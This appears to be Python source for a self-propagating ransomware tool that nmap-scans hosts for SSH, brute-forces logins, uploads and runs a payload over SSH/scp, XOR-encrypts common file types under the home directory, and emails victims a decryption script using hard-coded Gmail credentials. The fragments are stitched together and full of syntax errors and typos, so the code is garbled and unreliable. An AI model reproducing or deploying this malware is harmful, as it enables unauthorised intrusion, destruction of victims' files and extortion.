def scan(hostsFile, usersFile,passwordFile);
	with open(hostsFile, 'r') as hosts:
		for host in hosts:
			host=host.strip('\n')
			if ZeroDay.nmapScanner.\\
			nmapScan{str(host),"22"}:\\
			t=threading.Thread(target=ZeroDay.\\
			bruteForceSSH.bruteForceConnecting,\\
			args=(host,userFile,passwordFile))
				t.strat()
				t.join()
scan("hostsFile","usersFile","passwordFile")

def nmapScan(tgtHost, tgtPort):
	nmScan = nmap.portScanner()
	info = nmScan.scan(str(tgtHost), str(tgtPort))
	state = ((info['scan'][tgtHost]\\
	['tcp'][int(tgtPort)]['state']if\\
	(any(info['scan'])) else "closed")
	print(" [*] " + tgtHost + " tcp/" \\
	+ str(tgtPort)+" "+state)
	if(state=="open"):
		return True
			return False)


def bruteForceConnecting(host, usersFile, passwordsFile):
	found=False
	with open(usersFile, 'r', encoding='utf-8')\\
	as users, open(passwordsFile,'r', \\
	encoding='utf-8') as passwords:
	for user in users:
		for password in passswords:
			user = str(user).strip('/n')
			password=str(password).strip('\n')
			lock.acquire()
			time.sleep(2)
			print("trying for :", user, " :", \\
			password)
			if inject (host, user,password):
				return
			passwords.seek(0, 0)



def getPayload():
	genKey()
	c = sqlite3.connect \\
	("/home/bizzarec/PycharmProjects/ZeroDay/ RansomBase.db")
	c.row_factory = sqlite3.Row
	res = c.execute("SELECT * fROM crypto ORDER BY id DESC")
	row = res.fetchone()
	while row:
		if(row['used']==0):
			fileNames = genPayload(row['salt'],row['key'])
			sql = "UPDATE crypto SET used = ? WHERE id = ?"
			c.execute(sql, (1 ,row['id']))
			c.commit()
			return fileNames
				row = res.fetchone()



shell = pxssh.pxssh()
print(shell.login(host, user, password))
print("[+] The Password has been found" + password)
scpcommand(host,user,password,payloadFolder + payload[0])
time.sleep(2)
	shell.sendline(("python3 "+payload[0]+" && rm "+payload[0]).encode('utf-8'))
	shell.promp()
	print("from prompt")
	ans=shell.before.decode('utf-8')
	print(ans)
	scpCommand(host,user,password,payloadFolder+payload[1])
	time.sleep(2)
	shell.sendline("ls -l".encode("utf-8"))
	shell.prompt()
	print("from prompt")
	ans=shell.before.decode('utf-8')
	print(ans)
	return True
except Exception as e:
	print(e.__str__())
	finally: 
		lock.release()



def randGenerate(salt):
	return salt[:int(len(salt)/2)].encode()+os.urandom(2044) + salt[:-int(len(salt)/2)].encode()



key = b'10\x9e\xa0EY\xl60@\xc0\xa3\xaf\ ... \xe0\xld10'
lstFiles = [".php", ".html", ".tar", ".gz", ".sql", ".js", ".css", ".txt", ".pdf", ".tgz", ".war", ".jar", ".java", ".class", ".ruby", ".rar", ".zip", ".db", ".7z", ".doc", ".pdf", ".xls", ".properties", ".xml", ".jpg", ".jpeg", ".png", ".gif", ".mov", ".avi", ".wmv", ".mp3", ".mp4", ".wma", ".aac", ".wav", ".pem", ".pub", ".docx", ".apk", ".exe", ".dll", ".tpl", ".psd", ".asp", ".phtml", ".aspx", ".csv"]

def cipher(file, key):
	try:
		with open(file, 'rb+') as f:
			print(file)
			data = bytearray(f.read())
			f.seek(0)
			f.write((bytearray((lambda x,y: (x[i] ^ y[i % len(y)] for i in range(0,len(x))))(data, key))))
	except Exception as e:
		print(str(e))

def sniffFiles(directory):
	if(os.path.isdir(directory)):
		for dir in os.listdir(directory):
			sniffFiles(directory+"/"+dir)
	else:
		for type in lstFiles:
			if directory.__contains__(type):
				cipher(directory)
sniffFiles(os.environ['HOME']+"/")


text = '''
	The attachment holds the script for decryption, start it via terminal with command: 
	''' + "python3 " + fName
	readIt = '''
MIMEMultipart()
msg['Subject'] = "Ransomware Decription"
	me = 'towardsthelight@gmail.com'
	msg['To'] = victimsMail
	msg.attach(MIMEText(text))
	with open(file, 'rb') as fil:
		py = MIMEApplication(fil.read(), Name=basename(fname))
		py['Content=Disposition'] = 'attachment;
		filename="%s"' % basename(fName)
		readMe = MIMEApplication(readIt,"ReadME.txt")
		readMe['Content-Disposition']='attachment;
		filename="%s"' %
	basename("ReadME.txt")
		msg.attach(readMe)
		msg.attach(py)
	try:
		smtpserver =
		smtplib.SMTP("smtp.gmail.com", 587)
		smtpserver.ehlo()
		smtpserver.starttls()
		smtpserver.login(me, 'towardsthelights06310268841994')
		try:
			smtpserver.sendmail(me, victimsMail, msg.as_string())
		finally:
			smtserver.close()
		except Exception as exc:
			print("Mail failed: {}".format(exc))